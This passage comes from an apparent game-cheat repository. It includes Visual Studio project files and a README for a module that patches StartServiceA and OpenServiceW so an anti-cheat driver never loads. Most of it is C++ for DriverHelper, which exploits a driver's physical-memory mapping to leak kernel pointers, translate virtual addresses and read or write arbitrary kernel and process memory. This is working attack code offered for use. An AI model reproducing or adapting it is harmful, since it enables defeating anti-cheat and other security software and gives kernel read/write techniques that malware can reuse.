    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalLibraryDirectories>$(SolutionDir)Debug\CheatHelper.lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
      <AdditionalLibraryDirectories>$(VCInstallDir)lib;C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Tools\MSVC\14.16.27023\lib\onecore\x64;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="pch.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="DriverDisabler.cpp" />
    <ClCompile Include="pch.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ProjectReference Include="..\CheatHelper\CheatHelper.vcxproj">
      <Project>{a080c117-d1db-4671-8217-65496573ba4d}</Project>
    </ProjectReference>
  </ItemGroup>
  <ItemGroup>
    <None Include="README.md" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`DriverDisabler/DriverDisabler.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="pch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="pch.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="DriverDisabler.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="README.md" />
  </ItemGroup>
</Project>
```

`DriverDisabler/README.md`:

```md
# DriverDisabler

## Introduction


## Usage

This Module will inject a "return" on the methods StartServiceA and OpenServiceW in order to prevent to the anti-cheat to load the driver.

Some Anti-Cheat (AC) load their service/driver from within the game. By injecting a return the method will get executed but no service will be started.

This module can be easily adapted to disable AC services that are started by using different methods.

## Configuration

This module does not requires much configuration, compile for the required architecture (x86/x64) and inject it.

**targetProc** need to be provided by usign config.ini file.

## Combination with other techniques

- Run this before the Anti-cheat is loaded completely. 

```

`DriverDisabler/pch.cpp`:

```cpp
// pch.cpp: source file corresponding to pre-compiled header; necessary for compilation to succeed

#include "pch.h"

// In general, ignore this file, but keep it around if you are using pre-compiled headers.

```

`DriverDisabler/pch.h`:

```h
// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

#ifndef PCH_H
#define PCH_H

// TODO: add headers that you want to pre-compile here

#endif //PCH_H

```

`DriverHelper/DriverHelper.cpp`:

```cpp
#include "DriverHelper.h"


// Check windows
#if _WIN32 || _WIN64
#if _WIN64
#define ENV64BIT
#else
#define ENV32BIT
#endif
#endif


HANDLE DriverHelper::hDeviceDrv = NULL;
_fn_memcpy DriverHelper::fn_memcpy = 0;
_fn_mapPhysical DriverHelper::fn_mapPhysical = 0;
_fn_unmapPhysical DriverHelper::fn_unmapPhysical = 0;
uintptr_t DriverHelper::DTBTargetProcess = 0;
uintptr_t DriverHelper::virtualSizeTargetProcess = 0;
uintptr_t DriverHelper::pBaseAddressTargetProcess = 0;
uintptr_t DriverHelper::pVadRootTargetProcess = 0;
uintptr_t DriverHelper::pPEBTargetProcess = 0;
std::vector<EnumerateRemoteSectionData> DriverHelper::sections;
std::vector<EnumerateRemoteModuleData> DriverHelper::modules;

// Thanks to Jackson (http://jackson-t.ca/lg-driver-lpe.html)
int DriverHelper::memmem(PBYTE haystack, DWORD haystack_size, PBYTE needle, DWORD needle_size)
{
	int haystack_offset = 0;
	int needle_offset = 0;

	haystack_size -= needle_size;

	for (haystack_offset = 0; haystack_offset <= haystack_size; haystack_offset++) {
		for (needle_offset = 0; needle_offset < needle_size; needle_offset++)
			if (haystack[haystack_offset + needle_offset] != needle[needle_offset])
				break; // Next character in haystack.

		if (needle_offset == needle_size)
			return haystack_offset;
	}

	return -1;
}



int DriverHelper::getDeviceHandle(LPTSTR name)
{
	DriverHelper::hDeviceDrv = CreateFile(name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (DriverHelper::hDeviceDrv == INVALID_HANDLE_VALUE)
	{
		std::cout << "[-] Handle failed: " << std::dec << GetLastError() << std::endl;
		return 1;
	}
	std::cout << "[+] HANDLE obtained" << std::endl;
	return 0;
}


unsigned __int64 __fastcall DriverHelper::ExpLookupHandleTableEntryW7(__int64 HandleTable, unsigned __int64 handle)
{
	__int64 v2; // r8@2
	signed __int64 v3; // rcx@2
	__int64 v4; // r8@2
	unsigned __int64 result; // rax@3
	unsigned __int64 v6; // [sp+8h] [bp+8h]@1

	v6 = handle;
	v6 = handle & 0xFFFFFFFC;
	if (v6 >= *((DWORD *)(HandleTable + 23)))
	{
		result = 0i64;
	}
	else
	{
		v2 = *(__int64 *)HandleTable;
		v3 = *(__int64 *)HandleTable & 3i64;
		v4 = v2 - (unsigned int)v3;
		if ((DWORD)v3)
		{
			//JUMPOUT(v3, 1, sub_1403A0DE0);
			ULONGLONG tmp;
			DriverHelper::fn_memcpy((ULONGLONG)&tmp, v4 + ((handle - (handle & 0x3FF)) >> 7), sizeof(ULONGLONG));
			result = (tmp)+4 * (handle & 0x3FF);
		}
		else
		{
			result = v4 + 4 * handle;
		}
	}
	return result;
}

unsigned __int64 __fastcall DriverHelper::ExpLookupHandleTableEntryW10(__int64 HandleTable, __int64 handle)
{
	unsigned __int64 v2; // rdx@1
	__int64 v3; // r8@2
	signed __int64 v4; // rax@2
	ULONGLONG v5; // rax@3
	unsigned __int64 result; // rax@4

	v2 = handle & 0xFFFFFFFFFFFFFFFCui64;
	if (v2 >= *(DWORD *)HandleTable)
	{
		result = 0i64;
	}
	else
	{
		v3 = *(__int64 *)(HandleTable + 8);
		v4 = *(__int64 *)(HandleTable + 8) & 3i64;
		if ((DWORD)v4 == 1)
		{
			DriverHelper::fn_memcpy((ULONGLONG)&v5, (v3 + 8 * (v2 >> 10) - 1), sizeof(ULONGLONG));
			return v5 + 4 * (v2 & 0x3FF);
		}
		if ((DWORD)v4)
		{
			ULONGLONG tmp = DriverHelper::fn_mapPhysical((v3 + 8 * (v2 >> 19) - 2), sizeof(ULONGLONG));
			v5 = DriverHelper::fn_mapPhysical(tmp + 8 * ((v2 >> 10) & 0x1FF), sizeof(ULONGLONG));
			return v5 + 4 * (v2 & 0x3FF);
		}
		result = v3 + 4 * v2;
	}
	return result;
}



DWORDLONG DriverHelper::findPhisical(DWORDLONG startAddress,
	DWORDLONG stopAddress,
	DWORD searchSpace,
	PBYTE  searchBuffer,
	DWORD bufferSize)
{
	DWORDLONG matchAddress = 0;

	// Check if space search is bigger than maximum.
	if ((startAddress + searchSpace) > stopAddress)
		return matchAddress;

	// Map Physical into buffer
	ULONG64 buffer = DriverHelper::fn_mapPhysical(startAddress, searchSpace);

	int offset = DriverHelper::memmem((PBYTE)buffer, searchSpace, searchBuffer, bufferSize);

	//free
	DriverHelper::fn_unmapPhysical(buffer);

	if (offset >= 0)
		matchAddress = startAddress + offset;

	return matchAddress;

}


ULONG64 DriverHelper::findPhisical_ObjectTable(DWORDLONG startAddress,
	DWORDLONG stopAddress,
	DWORD searchSpace,
	PBYTE  searchBuffer,
	DWORD bufferSize)
{
	DWORDLONG matchAddress = NULL;
	DWORDLONG pObjectTableOffset = 0;

	DWORDLONG searchAddress = startAddress;



	while (TRUE)
	{
		if ((startAddress + searchSpace) >= stopAddress)
		{
			//free(ppivotProcess);
			return matchAddress;
		}

		if (searchAddress % 0x100000 == 0)
		{
			printf("Searching from address: 0x%016I64X.\r", searchAddress);
			fflush(stdout);
		}

		// Let's get 
		Sleep(0.5);
		matchAddress = findPhisical(searchAddress, _UI64_MAX, searchSpace, searchBuffer, bufferSize);

		if (searchAddress % 0x10000000 == 0)
		{
			Sleep(1000);
			fflush(stdout);
		}

		if (searchAddress == 0xffffffff)
		{
			exit(0);
		}

		if (matchAddress > searchAddress)
		{
			// Calculating the offset of ObjectTable inside the section
			// This is done due to compatibility, MmMapIoSpace allows to map not multiples of 0x1000, but MapSection doesn't, we can change the RW exploit and this will still work
			pObjectTableOffset = matchAddress - searchAddress - (OFFSET_IMAGEFILENAME - OFFSET_OBJECTTABLE);

			PBYTE pObjectTableAddr = (PBYTE)malloc(sizeof(DWORDLONG));

			ULONG64 buf = DriverHelper::fn_mapPhysical(searchAddress, searchSpace);
			memcpy(pObjectTableAddr, ((void*)(buf + pObjectTableOffset)), sizeof(DWORDLONG));
			DriverHelper::fn_unmapPhysical(buf);
			// here ^
			//((void**)pObjectTableAddr) deref pointer to pointer

			ULONG64 result = (ULONG64)(pObjectTableAddr);
			return result;
		}

		searchAddress += searchSpace;

	}
}


// From here we are implementing the V2 of DriverHelper. Focus will be set on implementing functions that allows us to exploit a driver and perform actions like: dump the target process and RWMemory from kernel.
// We can leak a kernel pointer to an EPROCESS structure. We can use this to traverse over the double linked list to enumerate every process.
bool DriverHelper::LeakKernelPointers(std::vector<uintptr_t> &pKernelPointers)
{

	SYSTEM_HANDLE_INFORMATION_EX* pHandleInfo = NULL;

	// Initial size of the buffer, we are going to make it bigger if it is necesary later
	DWORD lBuffer = 0x10000;

	// This option will allow us to get the list of kernel pointers
	const unsigned long SystemExtendedHandleInformation = 0x40;

	DWORD retSize = 0;
	NTSTATUS status;

	do {
        if (pHandleInfo != NULL) {
			// Cleaning the buffer if this is not the first execution of the DO
            HeapFree(GetProcessHeap(), 0, pHandleInfo);
            pHandleInfo = NULL;
        }

		// Expanding the buffer *2
        lBuffer *= 2;

		// Dinamically allocate memory on the Heap for the buffer. I tried to use VirtualAlloc but it didn't work.
        pHandleInfo = (SYSTEM_HANDLE_INFORMATION_EX*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lBuffer);

        if (pHandleInfo == NULL) 
		{
			std::cout << "[-] LeakKernelPointer pHandleInfo NULL" << std::endl;
			return false;
        }
    } while ((status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation), pHandleInfo, lBuffer, &retSize)) == STATUS_INFO_LENGTH_MISMATCH);

	/*
	The returned structure will have the following definition
	typedef struct SYSTEM_HANDLE_INFORMATION_EX
	{
		ULONG_PTR NumberOfHandles;
		ULONG_PTR Reserved;
		SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
	};
	*/

	std::cout << "[+] LeakKernelPointer NUmberOfHandles: " << pHandleInfo->NumberOfHandles << std::endl;
	// NumberOfHandles will tell us how many times we need to iterate the array.
	for (unsigned int i = 0; i < pHandleInfo->NumberOfHandles; i++ )
	{
		// Lets get all the handles from the process with PID 4 (system)
		ULONG SystemPID = 4;
		// Atribbute value for Process HANDLEs
		ULONG ProcessHandleAttribute = 0x102A;

		// Is this the best option? Maybe there is a better one
		if (pHandleInfo->Handles[i].UniqueProcessId == SystemPID && pHandleInfo->Handles[i].HandleAttributes == ProcessHandleAttribute)
		{
			pKernelPointers.push_back(reinterpret_cast<uintptr_t>(pHandleInfo->Handles[i].Object));
		}

	}
	return true;
}


// Thanks to https://twitter.com/SpecialHoang for this function
// https://github.com/hoangprod/DanSpecial/blob/master/DanSpecial/memory.cpp
uintptr_t DriverHelper::FindDirectoryBase()
{
	printf("[+] Attempting to find Dirbase.\n");

	for (int i = 0; i < 10; i++)
	{
		uintptr_t lpBuffer = DriverHelper::fn_mapPhysical(i * 0x10000, 0x10000);

		for (int uOffset = 0; uOffset < 0x10000; uOffset += 0x1000)
		{

			if (0x00000001000600E9 ^ (0xffffffffffff00ff & *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset)))
				continue;
			if (0xfffff80000000000 ^ (0xfffff80000000000 & *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset + 0x70)))
				continue;
			if (0xffffff0000000fff & *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset + 0xa0))
				continue;

			return *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset + 0xa0);
		}

		DriverHelper::fn_unmapPhysical((lpBuffer));
	}

	return NULL;
}



/*

0: kd> dd  0xffffbe8c2141d040
ffffbe8c`2141d040  00b60003 00000000 2141d048 ffffbe8c		<==== 00b60003 if KPROCESS
ffffbe8c`2141d050  2141d048 ffffbe8c 2141d058 ffffbe8c
ffffbe8c`2141d060  2141d058 ffffbe8c 001ab000 00000000
ffffbe8c`2141d070  214aa338 ffffbe8c 25089338 ffffbe8c
ffffbe8c`2141d080  00000000 00000000 00000000 00000000
ffffbe8c`2141d090  00140001 00000000 00000003 00000000
ffffbe8c`2141d0a0  00000000 00000000 00000000 00000000
ffffbe8c`2141d0b0  00000000 00000000 00000000 00000000


0: kd> dt nt!_KPROCESS 0xffffbe8c2141d040
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 ProfileListHead  : _LIST_ENTRY [ 0xffffbe8c`2141d058 - 0xffffbe8c`2141d058 ]
   +0x028 DirectoryTableBase : 0x1ab000
   +0x030 ThreadListHead   : _LIST_ENTRY [ 0xffffbe8c`214aa338 - 0xffffbe8c`25089338 ]
   +0x040 ProcessLock      : 0

*/
// This is necessary to check if the pointer we have its a KPROCESS pointer :)
uintptr_t DriverHelper::ObtainKProcessPointer(uintptr_t directoryTableBase, std::vector<uintptr_t> pKernelPointers)
{
	//The header of a KPROCESS has the value 00b60003
	unsigned int KProcessHeader = 0x00b60003;

	unsigned int bHeader = 0;

	for (uintptr_t pointer : pKernelPointers)
	{
		// read header
		DriverHelper::ReadVirtualMemory(directoryTableBase, pointer, &bHeader, sizeof(unsigned int), NULL);


		// Compare Header with value
		if (bHeader == KProcessHeader)
		{
			std::cout << "[+] ObtainKProcessPointer found." << std::endl;
			return pointer;
		}

		std::cout << "[-] ObtainKProcessPointer not found." << std::endl;
	}
	
	return 0;

}


// Write a Physical memory
bool DriverHelper::WritePhyMemory( uintptr_t physicalAddress,LPVOID  lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten)
{
	// Read physical memory
	uint64_t memory = DriverHelper::fn_mapPhysical(physicalAddress, nSize);

	if (!memory)
		return false;

	// Copy the new value to the already mapped physical memory
	memcpy((void*)memory, (const void*)lpBuffer , nSize);

	// Free mapped memory so we can persist the changes
	DriverHelper::fn_unmapPhysical(memory);
	
	return true;
}

// Read a Physical memory
bool DriverHelper::ReadPhyMemory( uintptr_t physicalAddress, LPVOID  lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesRead)
{
// Read physical memory
	uint64_t memory = DriverHelper::fn_mapPhysical(physicalAddress, nSize);
	
	if (!memory)
		return false;

	// Copy the buffer so we can free the mapped memory
	memcpy((void*)lpBuffer, (const void*)memory, nSize);

	// Free mapped memory
	DriverHelper::fn_unmapPhysical(memory);
	
	return true;

}


// Write a VirtualMemory (Kernel or Usermode)
bool DriverHelper::WriteVirtualMemory(uint64_t directoryTableBase, uintptr_t virtualAddress, LPVOID  lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten)
{

	// Translate Virtual to physical
	uint64_t physicalAddress = DriverHelper::VAtoPhylAddress(directoryTableBase,  (LPVOID) virtualAddress);

	// Control if physicalAddress is valid
	if (!physicalAddress)
		return false;

	// Read physical memory
	uint64_t memory = DriverHelper::fn_mapPhysical(physicalAddress, nSize);

	if (!memory)
		return false;

	// Copy the new value to the already mapped physical memory
	memcpy((void*)memory, (const void*)lpBuffer , nSize);

	// Free mapped memory so we can persist the changes
	DriverHelper::fn_unmapPhysical(memory);

	return true;
}

// Read a VirtualMemory (Kernel or Usermode)
bool DriverHelper::ReadVirtualMemory(uint64_t directoryTableBase, uintptr_t virtualAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesRead)
{
	//std::cout << virtualAddress << std::endl;
	// Translate Virtual to physical
	uint64_t physicalAddress = DriverHelper::VAtoPhylAddress(directoryTableBase, (LPVOID)virtualAddress);
	
	//std::cout << physicalAddress << std::endl;
	// Control if physicalAddress is valid
	if (!physicalAddress)
		return false;

	// Read physical memory
	uint64_t memory = DriverHelper::fn_mapPhysical(physicalAddress, nSize);

	if (!memory)
		return false;

	// Copy the buffer so we can free the mapped memory
	memcpy((void*)lpBuffer, (const void*)memory, nSize);

	// Free mapped memory
	DriverHelper::fn_unmapPhysical(memory);

	return true;
}



// Translating Virtual Address To Physical Address, Using a Table Base
// We need to provide the DTB (DirectoryTableBase) to transform properly the virtual address to physical
// DTB is used to resolve properly the contex of the VA and it corresponds to the value stored on CR3 or EPROCESS.PEB.DirectoryTableBase
// If we want to resolve a VA from a particular process a RING 3, we need this value, and it corresponds to the base address of the table.
// Good explanation of how the transformation works https://blog.xpnsec.com/total-meltdown-cve-2018-1038/
uint64_t DriverHelper::VAtoPhylAddress(uintptr_t directoryTableBase, LPVOID virtualAddress)
{
	uintptr_t va = (uint64_t)virtualAddress;

	// PMl4 - Page Map level 4
	// PDPT - Page Directory Pointer Table
	// PD - Page Directory
	// PT - Page Table 
	unsigned short PML4 = (USHORT)((va >> (12 + 9 + 9 + 9)) & 0x1FF);
	unsigned short PDPT = (USHORT)((va >> (12 + 9 + 9)) & 0x1FF);
	unsigned short PD = (USHORT)((va >> (12 + 9)) & 0x1FF);
	unsigned short PT = (USHORT)((va >> 12) & 0x1FF);
	////std::cout << "- virtualAddress " << virtualAddress << std::endl;
	////std::cout << "- directoryTableBase" << directoryTableBase << std::endl;
	////std::cout << "- PML4 " << PML4 << std::endl;
	////std::cout << "- PDPT " << PDPT << std::endl;
	////std::cout << "- PD " << PD << std::endl;
	////std::cout << "- PT " << PT << std::endl;

	// Obtain the PML4 Entry (PML4E)
	uintptr_t PML4E = 0;
	DriverHelper::ReadPhyMemory(directoryTableBase + PML4 * sizeof(ULONGLONG),&PML4E, sizeof(uint64_t), NULL);
	//std::cout << "- PML4E " << PML4E << std::endl;
	if (PML4E == 0)
		return 0;

	// Obtain the PDPT Entry. It is the base address of the next table
	uintptr_t PDPTE = 0;
	DriverHelper::ReadPhyMemory((PML4E & 0xFFFFFFFFFF000) + PDPT * sizeof(ULONGLONG), &PDPTE, sizeof(uint64_t), NULL);
	////std::cout << "- PDPTE " << PDPTE << std::endl;
	if (PDPTE == 0)
		return 0;

	// Checking this bit will allow us to determinate if PDPTE maps a 1GB page or not.
	// In that case we need to calculate the final base address extracting bits 51-30 (0xFFFFFC0000000) 
	// from PDPTE nad bits 29-0 from the VA (0x3FFFFFFF).
	if ((PDPTE & (1 << 7)) != 0)
		return (PDPTE & 0xFFFFFC0000000) + (va & 0x3FFFFFFF);

	// If PS bit was zero we need to obtain the base address of the next table on the chain.
	uint64_t PDE = 0;
	DriverHelper::ReadPhyMemory((PDPTE & 0xFFFFFFFFFF000) + PD * sizeof(ULONGLONG), &PDE, sizeof(uint64_t), NULL);
	////std::cout << "- PDE " << PDE << std::endl;
	if (PDE == 0)
		return 0;

	// Again we need to check the PS flag for PDE, in this case it will be a 2MB page if 1.
	// In that case we need to calculate the final base address extracting bits 51-21 (0xFFFFFFFE00000)
	// from PDE and 20-0 from the VA (0x1FFFFF)
	if ((PDE & (1 << 7)) != 0)
		return (PDE & 0xFFFFFFFE00000) + (va & 0x1FFFFF);

	// Let's obtain the PT entry if PS was 0.
	uintptr_t PTE = 0;
	DriverHelper::ReadPhyMemory((PDE & 0xFFFFFFFFFF000) + PT * sizeof(ULONGLONG), &PTE,  sizeof(uint64_t), NULL);
	////std::cout << "- PTE " << PTE << std::endl;

	if (PTE == 0)
		return 0;

	// Each PTE corresponds to a 4KB page. Final physical address is obtaining extracting the bits 51-12 from the PTE (0xFFFFFFFFFF000)
	// and the 11-0 from the VA (0xFFF).
	return (PTE & 0xFFFFFFFFFF000) + (va & 0xFFF);
}



uintptr_t DriverHelper::GetKProcess( uintptr_t &directoryTableBase)
{
	// Define the vector of pointers to return
	std::vector<uintptr_t> pKernelPointers;

	// We need the DirectoryBaseTable of the process to translate Virtual to Phyisical Addresses
	directoryTableBase = DriverHelper::FindDirectoryBase();

	std::cout << "[+] GetKprocess - directoryTableBase 0x" << std::hex << directoryTableBase << std::endl;

	// Lets use NtQuerySystemInformation with SystemExtendedHandleInformation to get the list of kernel pointers
	if (!(DriverHelper::LeakKernelPointers(pKernelPointers)))
		return 0;

	// Validate KProcess Header to identify all the handles to KPROCESS structures.
	auto pKprocess = DriverHelper::ObtainKProcessPointer(directoryTableBase, pKernelPointers);

	if (pKprocess == 0)
	{
		std::cout << "[-] ObtainKProcessPointer not found." << std::endl;
		return 0;
	}

	return pKprocess;
}



//0: kd > dt nt!_EPROCESS 0xFFFFDA8ADA8E2800
//+ 0x000 Pcb              : _KPROCESS
//+ 0x2d8 ProcessLock : _EX_PUSH_LOCK
//+ 0x2e0 RundownProtect : _EX_RUNDOWN_REF
//+ 0x2e8 UniqueProcessId : 0x00000000`00000638 Void
//+ 0x2f0 ActiveProcessLinks : _LIST_ENTRY[0xffffda8a`da9634f0 - 0xffffda8a`da86daf0]
//+ 0x450 ImageFileName    : [15]  "spoolsv.exe"
//+ 0x45f PriorityClass : 0x2 ''
//+ 0x460 SecurityPort : (null)
//  +0x3b0 Job              : 0xffffda8a`de7ca860 _EJOB
//   +0x3b8 SectionObject    : 0xffffc98f`cdb93180 Void
//   +0x3c0 SectionBaseAddress : 0x00007ff6`18b50000 Void

uintptr_t DriverHelper::SearchKProcess(LPCVOID processName, uintptr_t &directoryTableBase, uintptr_t pKProcess)
{

	uintptr_t initialProcessId = 0;
	DriverHelper::ReadVirtualMemory(directoryTableBase, pKProcess + OFFSET_UNIQUEPROCESSID, &initialProcessId, sizeof(initialProcessId), NULL);
	uintptr_t currentProcessId = 0;
	uintptr_t currentKProcess = 0;


	PLIST_ENTRY   initialEntry = (PLIST_ENTRY)(pKProcess + OFFSET_ACTIVEPROCESSLINKS);
	PLIST_ENTRY currentEntry = initialEntry;
	uintptr_t imagefilename_offset = OFFSET_IMAGEFILENAME - OFFSET_ACTIVEPROCESSLINKS;

	do 
	{	
		char currentKProcessName[15] = {0};
		
		// Obtain KProcessName
		DriverHelper::ReadVirtualMemory(directoryTableBase,reinterpret_cast<uintptr_t>(currentEntry) + imagefilename_offset, &currentKProcessName, sizeof(currentKProcessName), NULL);
		
		if (strcmp( static_cast<const char *>(processName), currentKProcessName) == 0)
		{
			//std::cout << "[+] KProcess Target Found: 0x" << std::hex << (uintptr_t)(currentEntry) - OFFSET_ACTIVEPROCESSLINKS << std::endl;
			return (uintptr_t)(currentEntry) - OFFSET_ACTIVEPROCESSLINKS;
		}

		// Set next entry on the list
		DriverHelper::ReadVirtualMemory(directoryTableBase,reinterpret_cast<uintptr_t>(currentEntry) + sizeof(uintptr_t), &currentEntry, sizeof(currentEntry), NULL);

	} while (currentEntry != initialEntry);


	return 0;

}

bool DriverHelper::ObtainKProcessInfo(uintptr_t &directoryTableBase, uintptr_t pKProcessAddress )
{
	std::cout << "\t[+] Grabing info from target process" << std::endl;
	if (!DriverHelper::ReadVirtualMemory(directoryTableBase, pKProcessAddress + OFFSET_SECTIONBASEADDRESS,
		&(DriverHelper::pBaseAddressTargetProcess), sizeof(uintptr_t), NULL))
	{
		std::cout << "[-] Failed trying to obtain the BaseAddress." << std::endl;
		return false;
	}
	std::cout << "\t[+] BaseAddress: 0x" << std::hex << DriverHelper::pBaseAddressTargetProcess << std::endl;


	if (!DriverHelper::ReadVirtualMemory(directoryTableBase, pKProcessAddress + OFFSET_DIRECTORYTABLEBASE,
		&(DriverHelper::DTBTargetProcess), sizeof(uintptr_t), NULL))
	{
		std::cout << "[-] Failed trying to obtain the DirectoryTableBase." << std::endl;
		return false;
	}
	std::cout << "\t[+] DirectoryTableBase: 0x" << std::hex << DriverHelper::DTBTargetProcess << std::endl;

